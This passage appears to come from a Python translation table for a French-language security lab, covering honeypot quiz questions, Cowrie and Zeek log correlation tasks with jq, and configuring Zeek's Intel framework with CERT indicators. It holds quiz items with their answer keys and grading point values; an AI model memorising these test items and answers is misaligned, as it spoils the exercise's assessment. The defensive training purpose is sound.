- why is every connection to a honeypot suspicious? @@{suspicious:>it offers no legitimate service: nobody has any reason to connect to it>>>no-use|its address is secret>>>secret|it only accepts attackers>>>attackers}@@
- the main risk of a poorly isolated honeypot? @@{risk:>serving as a pivot towards other machines: filter its outgoing connections>>>pivot|being too slow>>>slow|refusing the attackers>>>refuse}@@
""",
        "interaction moyenne ; aucun usage légitime ; risque de rebond": "medium interaction; no legitimate use; risk of pivoting",
        "Partie 5 — Corréler les journaux du pot de miel": "Part 5 — Correlating the honeypot logs",
        "Les journaux d'hier": "Yesterday's logs",
        """
Le pot de miel de production (la sonde `{sensor}`) a été attaqué hier. Sur `analyst`, `{cowrie}` est son
journal Cowrie de la journée, et `{conn}` le `conn.log` de la sonde Zeek de la DMZ pour la même journée
(format JSON). Répondez avec `jq` (sections @@ref:cowrie-logs@@ et @@ref:correlation@@) : le premier
journal raconte les sessions, le second les connexions, et seul le croisement des deux répond aux
dernières questions.
""": """
The production honeypot (the sensor `{sensor}`) was attacked yesterday. On `analyst`, `{cowrie}` is its
Cowrie log for the day, and `{conn}` the `conn.log` of the DMZ Zeek sensor for the same day (JSON
format). Answer with `jq` (sections @@ref:cowrie-logs@@ and @@ref:correlation@@): the first log tells
the story of the sessions, the second that of the connections, and only cross-referencing the two
answers the last questions.
""",
        "Les attaquants": "The attackers",
        """
- combien d'adresses différentes ont tenté au moins une authentification ? @@{n_ips:[0-9]+}@@
- l'adresse qui a échoué le plus souvent : @@{top_ip:[0-9.]+}@@
- le logiciel client qu'elle utilisait (le champ `version`, tel quel) : @@{top_version:.+}@@
""": """
- how many different addresses attempted at least one authentication? @@{n_ips:[0-9]+}@@
- the address that failed most often: @@{top_ip:[0-9.]+}@@
- the client software it was using (the field `version`, as is): @@{top_version:.+}@@
""",
        "le nombre d'adresses (3), l'adresse la plus active (2) et son client (2)": "the number of addresses (3), the most active address (2) and its client (2)",
        "La compromission": "The compromise",
        """
Un attaquant a réussi à se connecter, a téléchargé un programme et s'est ménagé un accès durable.

- l'URL du programme téléchargé : @@{url:.+}@@
- son SHA-256 : @@{sha256:[0-9a-fA-F]+}@@
- le commentaire de la clé SSH ajoutée par l'attaquant (le dernier mot de la clé) : @@{key_comment:.+}@@
- l'`uid` Zeek de la connexion SSH de cette session : @@{ssh_uid:C[0-9A-Za-z]+}@@
- l'`uid` Zeek de la connexion que le pot de miel a ouverte pour télécharger le programme : @@{out_uid:C[0-9A-Za-z]+}@@
""": """
An attacker managed to log in, downloaded a program and set up persistent access.

- the URL of the downloaded program: @@{url:.+}@@
- its SHA-256: @@{sha256:[0-9a-fA-F]+}@@
- the comment of the SSH key added by the attacker (the last word of the key): @@{key_comment:.+}@@
- the Zeek `uid` of the SSH connection of this session: @@{ssh_uid:C[0-9A-Za-z]+}@@
- the Zeek `uid` of the connection that the honeypot opened to download the program: @@{out_uid:C[0-9A-Za-z]+}@@
""",
        "l'URL (2), le SHA-256 (2), le commentaire de la clé (2), l'uid SSH (2), l'uid sortant (2)": "the URL (2), the SHA-256 (2), the key comment (2), the SSH uid (2), the outgoing uid (2)",
        "Bonus — Le cadre Intel": "Bonus — The Intel framework",
        "Les indicateurs du CERT": "The CERT's indicators",
        """
Le CERT vous transmet trois indicateurs de compromission : le domaine `{domain}`, l'adresse `{addr}` et
l'URL `http://{url}`. Sur `sensor` (section @@ref:intel@@) :

1. écrivez `{intel}` avec ces trois indicateurs (la source et la description sont libres) ;
2. dans `local.zeek`, chargez `frameworks/intel/seen` et ce fichier (`Intel::read_files`).

Si la sonde de la partie 1 tourne, `zeekctl deploy` : une requête `dig @www {domain}` depuis `analyst`
doit apparaître dans `intel.log`. L'évaluation rejoue hors ligne une capture contenant les trois
indicateurs, avec `zeek --pseudo-realtime=1 -r ... local` : elle ne dépend pas de la partie 1.
""": """
The CERT sends you three indicators of compromise: the domain `{domain}`, the address `{addr}` and the
URL `http://{url}`. On `sensor` (section @@ref:intel@@):

1. write `{intel}` with these three indicators (the source and the description are up to you);
2. in `local.zeek`, load `frameworks/intel/seen` and this file (`Intel::read_files`).

If the sensor of part 1 is running, `zeekctl deploy`: a query `dig @www {domain}` from `analyst` must
show up in `intel.log`. The evaluation replays offline a capture containing the three indicators, with
`zeek --pseudo-realtime=1 -r ... local`: it does not depend on part 1.
""",
        "intel.log reconnaît l'indicateur {kind}": "intel.log recognises the indicator {kind}",
    },
}
